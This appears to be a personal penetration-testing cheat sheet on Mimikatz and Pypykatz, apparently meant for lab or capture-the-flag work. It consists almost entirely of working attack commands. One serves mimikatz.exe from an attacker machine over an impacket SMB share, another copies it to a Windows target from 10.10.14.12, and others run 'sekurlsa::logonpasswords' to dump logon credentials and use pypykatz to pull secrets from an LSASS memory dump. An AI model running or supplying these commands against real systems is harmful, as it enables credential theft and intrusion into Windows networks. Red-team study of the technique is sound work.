# Mimikatz

## Mimikatz

Locate
```
locate mimikatz.exe
```

Host mimikatz - x86
```
cd /usr/share/windows-resources/mimikatz/Win32/
$ impacket-smbserver share $(pwd) -smb2support
```

Host mimikatz - x64
```
cd /usr/share/windows-resources/mimikatz/x64/
$ impacket-smbserver share $(pwd) -smb2support
```


Copy to Target
```
xcopy \\10.10.14.12\share\mimikatz.exe C:\Temp\mimikatz\
```



PowerShell
```
.\mimikatz "privilege::debug" "log sekurlsa.log" "sekurlsa::logonpasswords" exit
```

CMD
```
mimikatz "privilege::debug" "log sekurlsa.log" "sekurlsa::logonpasswords" exit
```



## Pypykatz

Get secrets from memory dump
```
pypykatz lsa minidump --grep lsass.DMP
```